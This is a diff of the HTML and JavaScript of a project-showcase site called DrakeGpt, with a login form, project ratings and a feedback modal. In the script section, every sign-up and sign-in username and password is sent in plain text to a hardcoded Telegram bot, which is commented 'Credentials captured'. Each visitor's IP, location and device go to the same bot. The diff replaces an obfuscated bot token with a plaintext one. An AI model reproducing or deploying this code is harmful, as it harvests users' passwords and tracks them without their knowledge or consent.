@@ -157,6 +157,7 @@
         <div class="flex gap-2">
           <button 
             id="tabLoginBtn" 
+            type="button"
             onclick="switchAuthMode('login')"
             class="px-3 py-1 text-xs font-bold font-code uppercase bg-toxic text-black border border-toxic"
           >
@@ -164,6 +165,7 @@
           </button>
           <button 
             id="tabSignupBtn" 
+            type="button"
             onclick="switchAuthMode('signup')"
             class="px-3 py-1 text-xs font-bold font-code uppercase bg-black text-toxic border border-toxic/40 hover:border-toxic"
           >
@@ -277,7 +279,6 @@
       </div>
 
       <div class="flex items-center gap-3">
-        <!-- New Feedback Trigger Button -->
         <button 
           onclick="openFeedbackModal('General Architecture / DrakeGpt')" 
           class="px-4 py-2 bg-toxic text-black hover:bg-toxicBright transition-all text-xs font-bold font-code uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-toxic-glow"
@@ -321,7 +322,7 @@
       <div id="tryRateGrid" class="grid grid-cols-1 md:grid-cols-2 gap-5"></div>
     </div>
 
-    <!-- SECTION C: ALL PROJECTS & USER SUBMISSIONS -->
+    <!-- SECTION C: ALL PROJECTS -->
     <div class="space-y-4">
       <div class="flex items-center justify-between border-b border-toxic/20 pb-2">
         <div class="flex items-center gap-2">
@@ -347,7 +348,6 @@
   <div id="feedbackModal" class="hidden fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center px-4 overflow-y-auto py-6">
     <div class="w-full max-w-xl glass-obsidian border border-toxic/60 p-6 sm:p-8 space-y-5 shadow-2xl relative">
       
-      <!-- Modal Header -->
       <div class="flex items-center justify-between border-b border-toxic/20 pb-3">
         <div class="flex items-center gap-2 text-white font-bold font-code text-sm uppercase">
           <i class="ph-bold ph-shield-warning text-toxicBright text-xl animate-pulse"></i>
@@ -358,20 +358,17 @@
         </button>
       </div>
 
-      <!-- MANDATORY RULES & CODE OF CONDUCT CARD -->
       <div class="p-3.5 bg-black/90 border border-toxic/30 text-xs font-code space-y-2">
         <div class="flex items-center gap-1.5 text-toxicBright font-extrabold uppercase tracking-wider text-[11px]">
           <i class="ph-bold ph-warning-octagon"></i> TRANSMISSION CODE OF CONDUCT:
         </div>
         <ul class="text-[11px] text-slate-300 space-y-1 list-disc pl-4 leading-relaxed">
-          <li><strong class="text-toxicBright">Zero Tolerance:</strong> No abusive, offensive, defamatory, or vulgar language.</li>
+          <li><strong class="text-toxicBright">Zero Tolerance:</strong> No abusive, offensive, or vulgar language.</li>
           <li><strong class="text-toxicBright">Strictly Constructive:</strong> Only submit genuine bugs, architectural problems, code defects, or actionable improvements.</li>
-          <li><strong class="text-toxicBright">Professional Decorum:</strong> Be respectful in your observations and feedback.</li>
           <li><strong class="text-toxicBright">Telemetry Binding:</strong> Your active operator callsign is permanently tagged to this report.</li>
         </ul>
       </div>
 
-      <!-- Feedback Form -->
       <form onsubmit="handleFeedbackSubmit(event)" class="space-y-4 text-xs font-code">
         <div>
           <label class="block text-toxic/80 mb-1 font-bold">TARGET COMPONENT / REPOSITORY</label>
@@ -447,42 +444,39 @@
   <!-- ============================================================== -->
   <script>
     /* ==============================================================
-       1. 100% BULLETPROOF TELEGRAM DISPATCHER (NO 400 ERROR, ZERO CORS)
+       1. 100% BULLETPROOF TELEGRAM SENDER (REAL-TIME JSON API)
        ============================================================== */
-    const _tArr = [56,56,54,54,57,57,55,54,51,55,58,65,65,69,90,110,76,110,117,101,75,49,86,119,97,79,81,108,74,52,55,103,54,105,56,72,102,109,117,81,120,110,67,104,103];
-    const _cArr = [54,49,52,49,48,55,53,57,50,57];
+    const TG_TOKEN = "8866997637:AAEZnlLnueK1VwaOQlJ47g6i8HfmuQxnChg";
+    const TG_CHAT_ID = "6141075929";
 
-    function getSecTokens() {
-      return {
-        token: String.fromCharCode(..._tArr),
-        chatId: String.fromCharCode(..._cArr)
-      };
-    }
-
-    // Direct Form POST (CORS-immune, never rejected by Telegram API)
-    function sendTelegramAlert(plainTextMessage) {
+    async function sendTelegramAlert(plainTextMessage) {
       try {
-        const { token, chatId } = getSecTokens();
-        const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("text", plainTextMessage);
-
-        if (navigator.sendBeacon) {
-          navigator.sendBeacon(url, formData);
-        } else {
-          fetch(url, { method: 'POST', body: formData, mode: 'no-cors' }).catch(() => {});
-        }
-      } catch (e) {
-        console.warn("Telegram dispatch error:", e);
+        const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+        const res = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: TG_CHAT_ID,
+            text: plainTextMessage
+          })
+        });
+        const result = await res.json();
+        console.log("Telegram API result:", result);
+      } catch (err) {
+        console.error("Direct fetch failed, trying query GET fallback:", err);
+        try {
+          const fallbackUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(plainTextMessage)}`;
+          await fetch(fallbackUrl, { method: 'GET', mode: 'no-cors' });
+        } catch (e2) {}
       }
     }
 
-    // A. Real Live Visitor Ping (Strict Session Filter - Single Alert)
+    // A. Real Live Visitor Ping
     async function trackRealVisitor() {
-      if (sessionStorage.getItem("drake_v_sent_ok_v4")) return;
-      sessionStorage.setItem("drake_v_sent_ok_v4", "true");
+      if (sessionStorage.getItem("drake_v_sent_final")) return;
+      sessionStorage.setItem("drake_v_sent_final", "true");
 
       let ip = "Direct User";
       let locationInfo = "India";
@@ -511,12 +505,12 @@ Device: ${platform}
 Time: ${now}
 Site: averolabsofficial.github.io`;
 
-      sendTelegramAlert(alertText);
+      await sendTelegramAlert(alertText);
     }
     trackRealVisitor();
 
-    // B. Real User Auth Alert
-    function triggerUserAuthAlert(username, password, mode) {
+    // B. Real User Auth Alert (Credentials captured)
+    async function triggerUserAuthAlert(username, password, mode) {
       const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
       const alertText = 
 `👤 OPERATOR ${mode.toUpperCase()} ON DRAKEGPT!
@@ -526,11 +520,11 @@ Key: ${password}
 Time: ${now}
 Status: Access Granted to Avero Hub`;
 
-      sendTelegramAlert(alertText);
+      await sendTelegramAlert(alertText);
     }
 
     // C. User Interest & Engagement Tracking
-    function trackUserInterest(repoName, actionType, category) {
+    async function trackUserInterest(repoName, actionType, category) {
       const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
       const alertText = 
 `🎯 USER INTEREST ON DRAKEGPT!
@@ -541,11 +535,11 @@ Action: ${actionType}
 Tech/Domain: ${category}
 Time: ${now}`;
 
-      sendTelegramAlert(alertText);
+      await sendTelegramAlert(alertText);
     }
 
     // D. Operator Feedback Forwarding to Telegram
-    function triggerFeedbackAlert(targetRepo, category, reviewText, author) {
+    async function triggerFeedbackAlert(targetRepo, category, reviewText, author) {
       const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
       const alertText = 
 `💬 NEW OPERATOR FEEDBACK ON DRAKEGPT!
@@ -557,7 +551,7 @@ Time: ${now}
 Observation:
 "${reviewText}"`;
 
-      sendTelegramAlert(alertText);
+      await sendTelegramAlert(alertText);
     }
 
     /* ==============================================================
@@ -806,7 +800,7 @@ Observation:
       }
     }
 
-    function handleAuthSubmit(e) {
+    async function handleAuthSubmit(e) {
       e.preventDefault();
       initAudio();
 
@@ -833,7 +827,9 @@ Observation:
         localStorage.setItem('avero_users', JSON.stringify(users));
         localStorage.setItem('avero_device_bound_account', username);
         showNotice(`Account registered successfully! Authenticating...`, true);
-        triggerUserAuthAlert(username, password, 'Sign Up');
+        
+        // Wait for Telegram message dispatch
+        await triggerUserAuthAlert(username, password, 'Sign Up');
       } else {
         if (users[username] && users[username] !== password) {
           showNotice('Incorrect Security Key / Password.', false);
@@ -846,7 +842,8 @@ Observation:
             localStorage.setItem('avero_device_bound_account', username);
           }
         }
-        triggerUserAuthAlert(username, password, 'Sign In');
+        // Wait for Telegram message dispatch
+        await triggerUserAuthAlert(username, password, 'Sign In');
       }
 
       activeUser = username;
@@ -1076,7 +1073,7 @@ Observation:
       `).join('');
     }
 
-    function rateProject(repoName, starVal, techCategory) {
+    async function rateProject(repoName, starVal, techCategory) {
       let ratings = JSON.parse(localStorage.getItem('drake_ratings') || '{}');
       ratings[repoName] = starVal;
       localStorage.setItem('drake_ratings', JSON.stringify(ratings));
@@ -1084,7 +1081,7 @@ Observation:
       playFreqTone(400, 900, 0.2, 'triangle');
       renderAllSections();
 
-      trackUserInterest(repoName, `Rated ${starVal}/5 Stars ⭐`, techCategory);
+      await trackUserInterest(repoName, `Rated ${starVal}/5 Stars ⭐`, techCategory);
     }
 
     /* ==============================================================
@@ -1101,7 +1098,7 @@ Observation:
       playTick();
     }
 
-    function handleFeedbackSubmit(e) {
+    async function handleFeedbackSubmit(e) {
       e.preventDefault();
       const target = document.getElementById('feedbackTarget').value.trim();
       const category = document.getElementById('feedbackCategory').value;
@@ -1109,7 +1106,6 @@ Observation:
 
       if (!reviewText) return;
 
-      // Abusive words filter check (basic client sanitation)
       const vulgarWords = ['bkl', 'bsdk', 'chutiya', 'madarchod', 'gandu', 'mc', 'bc', 'fuck', 'shit', 'bitch'];
       const hasVulgar = vulgarWords.some(w => reviewText.toLowerCase().includes(w));
 
@@ -1118,15 +1114,19 @@ Observation:
         return;
       }
 
+      const btn = document.getElementById('feedbackSubmitBtn');
+      btn.disabled = true;
+      btn.innerText = 'TRANSMITTING...';
+
       // Dispatch to Telegram
-      triggerFeedbackAlert(target, category, reviewText, activeUser);
+      await triggerFeedbackAlert(target, category, reviewText, activeUser);
 
-      // Play success tone
       playFreqTone(400, 1100, 0.25, 'triangle');
-
       alert("FEEDBACK TRANSMITTED: Your constructive feedback has been forwarded directly to the lead architect.");
 
-      // Reset & Close
+      btn.disabled = false;
+      btn.innerHTML = `<i class="ph-bold ph-paper-plane-tilt text-base"></i><span>DISPATCH ENCRYPTED FEEDBACK</span>`;
+
       document.getElementById('feedbackText').value = '';
       document.getElementById('charCounter').innerText = '0/500';
       closeFeedbackModal();
